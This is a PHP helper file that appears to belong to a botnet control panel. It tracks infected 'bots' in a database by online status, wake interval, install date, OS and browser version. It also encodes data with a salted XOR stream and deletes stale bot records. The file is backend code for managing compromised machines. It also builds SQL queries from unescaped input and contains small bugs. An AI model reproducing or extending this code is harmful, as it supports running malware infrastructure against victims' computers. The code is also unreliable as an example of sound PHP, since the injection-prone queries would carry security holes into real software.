<?
	if (!defined('IN_BNCP')) exit;
##
	function GetTimeStamp($date) 
	{
	  list($year, $month, $day, $hour, $minute, $second) = preg_split('/[ :\/.-]/', $date, -1, PREG_SPLIT_NO_EMPTY);
	  return gmmktime ($hour, $minute, $second, $month, $day, $year);
	}
##
	function encode($String, $Password) 
	{
		$Salt='BGuxLWQtKweKEMV4';
		$StrLen = strlen($String);
		$Seq = $Password;
		$Gamma = '';
		while (strlen($Gamma) < $StrLen)
		{
			$Seq = pack("H*", sha1($Gamma.$Seq.$Salt));
			$Gamma .= substr($Seq, 0, 8);
		}
	   
		return $String^$Gamma;
	}
##
	function refresh_bot_info() 
	{
		global $db;
		$icfg = $db->GetConfigs();
		
		$sql = "UPDATE bots_t SET status_bot='offline' WHERE ADDDATE(date_last_online_bot, INTERVAL wake_time_bot+10 SECOND) < CONVERT_TZ(now(),@@time_zone,'+0:00')";
		$db->query($sql);
		if( $db->affected_rows == -1)
			writelog("error.log", "[ERROR] : Wrong query : '$sql'");
		
		
		$del_period_days = (int)$icfg['del_period_days'];
		if ( $del_period_days <= 0 ) 
		{
			writelog('error.log', 'del_period_days == '.$icfg['del_period_days']);
			$db->SetConfig('del_period_days', 1000);
		}

		$sql = "DELETE FROM bots_t WHERE ( select to_days(CONVERT_TZ(now(),@@time_zone,'+0:00')) - to_days(date_install_bot) ) > ".$del_period_days;
		$res = $db->query($sql);
		if ($aff = $res->affected_rows)	writelog('debug.log', "$aff bot was deleted (del_period_days = $del_period_days)");
	}
## write log to file
	function writelog ($type, $data)
	{
		$type = strtolower($type[0]);
		$data = addslashes(date("r") . " - " . $data);
		global $db;
		$sql = "INSERT INTO logs_t VALUES(NULL, '$type', '$data')";
		$db->query($sql);
		return $db->affected_rows;
	}
## write file
	function writefile ($url, $data)
	{
		 $url = trim(htmlspecialchars($url));
		 $f = fopen($url, "a");
		 $res = fwrite($f, $data . "\n");
		 fclose($f);
		 return res;
	}
## 
	function get_os($no) 
	{
		global $db;
		$parts = explode('.', $no);
		$ver = $parts[0].'.'.$parts[1];
		
		$sql = "SELECT name FROM os_t WHERE version='$ver'";
		
		$res = $db->query($sql);
		$mres = $res->fetch_array();
		
		return ($mres['name']) ? $mres['name'] : 'Unknown';
	}
##
	function get_ie($no) 
	{
		return 'IE '.$no;
	}
##
	function get_uniqfile($file, $n=0) 
	{
		ereg('(.+)\.(.*)$', $file, $ext);
		
		if (GetFile($file)) 
		{
			$n++;
			$file = get_uniqfile($ext[1].$n.'.'.$ext[2], $n);
		}
		return $file;
	}
## Get logs from DB
	function GetLogs($type, $LIMIT=100, $SKIP=0)
	{
		global $db;
		$sql = "SELECT * FROM logs_t WHERE logType='$type' ORDER BY logId DESC LIMIT $SKIP,$LIMIT";
		$res = $db->query($sql);
		$RESULT = Array();
		if( $db->affected_rows && is_object($res) )
		{
			while($row = $res->fetch_array())
				$RESULT[] = $row;
		}
		return $RESULT;
	}
## convert ascii to hex
	function ascii2hex($ascii) 
	{
		$hex = '';
		for ($i = 0; $i < strlen($ascii); $i++) {
			$byte = strtoupper(dechex(ord($ascii{$i})));
			$byte = str_repeat('0', 2 - strlen($byte)) . $byte;
			$hex .= $byte;
		}
		return $hex;
	}
## get crc32
	function GetCRC32($cont)
	{
		$size = strlen($cont);
		$crc32 = substr($cont, $size - 4, 4);
		$crc32i = ascii2hex($crc32);
		$crc32 = substr($crc32i, 6, 2) . substr($crc32i, 4, 2) . substr($crc32i, 2, 2) . substr($crc32i, 0, 2);
		return $crc32;
	}
## get data base server time
	function getDbTime()
	{
		global $db;
			
		$sql = "SELECT UNIX_TIMESTAMP( CONVERT_TZ(now(),@@time_zone,'+0:00') )";
		$res = $db->query($sql);
		if (!(@($res))) 
		{
			writelog("error.log", "Wrong query : \" $sql \"");
			die( "<font class='error'>ERROR</font> : Wrong query : $sql<br><br>" );
		}
		list($date) = $res->fetch_row();
		
		return $date;
	} 
## 
	function GetBotVers()
	{
		global $db;
		$sql = "SELECT ver_bot FROM bots_t GROUP by ver_bot";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			$result = array();
			while( $ver = $res->fetch_array() ) $result[] = $ver;
			return $result;
		}
		return 0;
	}
## 
	function GetAllBots()
	{
		global $db;
		$sql = "SELECT id_bot FROM bots_t";
		$res = $db->query($sql);
		if( $db->affected_rows && is_object($res) )
		{
			$result = array();
			while( list($botid) = $res->fetch_row() ) $result[] = $botid;
			return $result;
		}
		return 0;
	}
?>	